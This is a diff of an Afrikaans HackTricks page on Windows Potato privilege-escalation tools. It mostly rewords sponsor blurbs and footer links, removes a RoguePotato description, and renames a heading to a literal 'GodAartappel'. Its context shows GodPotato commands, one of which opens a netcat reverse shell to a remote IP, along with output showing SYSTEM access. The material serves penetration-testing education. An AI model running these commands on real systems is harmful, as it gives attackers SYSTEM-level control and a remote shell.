@@ -14,15 +14,15 @@ Ander maniere om HackTricks te ondersteun:
 
 </details>
 
-## WhiteIntel
+### [WhiteIntel](https://whiteintel.io)
 
-<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
 
-[**WhiteIntel**](https://whiteintel.io) is 'n **dark-web** aangedrewe soekenjin wat **gratis** funksies bied om te kontroleer of 'n maatskappy of sy kliënte deur **diewe-malware** gekompromitteer is.
+[**WhiteIntel**](https://whiteintel.io) is 'n **dark-web** aangedrewe soekenjin wat **gratis** funksies bied om te kontroleer of 'n maatskappy of sy kliënte deur **steel-malware** is **gekompromiteer**.
 
-Die primêre doel van WhiteIntel is om rekening-oorneem en lospryse-aanvalle te bekamp wat voortspruit uit inligtingsteel-malware.
+Die primêre doel van WhiteIntel is om rekening-oorneeminge en lospryse-aanvalle te beveg wat voortspruit uit inligtingsteel-malware.
 
-Jy kan hul webwerf besoek en hul enjin **gratis** probeer by:
+Jy kan hul webwerf besoek en hul enjin vir **gratis** probeer by:
 
 {% embed url="https://whiteintel.io" %}
 
@@ -78,9 +78,7 @@ df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
 C:\temp>type C:\temp\w.log
 nt authority\system
 ```
-### RoguePotato
-
-RoguePotato is 'n tegniek wat gebruik maak van 'n kwesbaarheid in die Windows RPC-diens om plaaslike administratiewe regte te verkry op 'n Windows-masjien. Hierdie tegniek kan gebruik word om 'n aanvaller toe te laat om hul regte op 'n masjien te eskaleer sonder om enige wagwoorde te hoef te weet.
+### GodAartappel
 ```
 GodPotato -cmd "cmd /c whoami"
 GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
@@ -92,13 +90,13 @@ GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 * [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
 * [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
 
-## WhiteIntel
+### [WhiteIntel](https://whiteintel.io)
 
-<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>
 
-[**WhiteIntel**](https://whiteintel.io) is 'n **dark-web** aangedrewe soekenjin wat **gratis** funksies bied om te kontroleer of 'n maatskappy of sy kliënte deur **diefstal malware** **gekompromiteer** is.
+[**WhiteIntel**](https://whiteintel.io) is 'n **dark-web** aangedrewe soekenjin wat **gratis** funksies bied om te kontroleer of 'n maatskappy of sy kliënte deur **diewe malware** **gekompromiteer** is.
 
-Die primêre doel van WhiteIntel is om rekening-oorneem te bekamp en lospryse aanvalle as gevolg van inligtingsteel malware te voorkom.
+Hul primêre doel van WhiteIntel is om rekening-oorneem te bekamp en lospryse aanvalle as gevolg van inligtingsteel malware.
 
 Jy kan hul webwerf besoek en hul enjin **gratis** probeer by:
 
@@ -110,10 +108,10 @@ Jy kan hul webwerf besoek en hul enjin **gratis** probeer by:
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**SUBSKRIPSIEPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
